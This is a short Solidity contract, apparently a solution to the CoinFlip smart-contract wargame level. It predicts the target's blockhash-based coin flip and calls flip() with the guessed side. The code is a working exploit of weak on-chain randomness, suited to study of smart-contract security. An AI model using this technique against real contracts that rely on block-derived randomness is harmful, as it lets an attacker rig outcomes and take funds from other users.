// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

interface CoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    CoinFlipChallenge public challenge;

    constructor(address _challengeAddress) {
        challenge = CoinFlipChallenge(_challengeAddress);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue /
            57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool _side = coinFlip == 1 ? true : false;
        challenge.flip(_side);
    }

    receive() external payable {}
}
